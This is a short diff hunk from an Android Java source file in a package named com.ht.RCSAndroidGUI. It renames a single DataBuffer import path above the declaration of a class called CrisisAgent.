@@ -6,7 +6,7 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.evidence.Evidence;
-import com.ht.RCSAndroidGUI.utils.DataBuffer;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
 
 public class CrisisAgent extends AgentBase {
 
